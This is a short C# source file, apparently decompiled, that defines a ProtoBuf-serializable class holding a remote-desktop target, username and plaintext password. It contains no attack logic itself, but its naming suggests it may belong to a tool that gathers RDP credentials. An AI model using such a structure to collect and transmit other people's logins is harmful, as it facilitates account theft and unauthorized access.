using ProtoBuf;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
	[ProtoContract(Name = "RdpCredential")]
	public class RdpCredential : INotifyPropertyChanged
	{
		private string _target;

		private string _username;

		private string _password;

		[ProtoMember(1, Name = "Target")]
		public string Target
		{
			get
			{
				return _target;
			}
			set
			{
				_target = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Target"));
			}
		}

		[ProtoMember(2, Name = "Username")]
		public string Username
		{
			get
			{
				return _username;
			}
			set
			{
				_username = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Username"));
			}
		}

		[ProtoMember(3, Name = "Password")]
		public string Password
		{
			get
			{
				return _password;
			}
			set
			{
				_password = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Password"));
			}
		}

		public event PropertyChangedEventHandler PropertyChanged;
	}
}
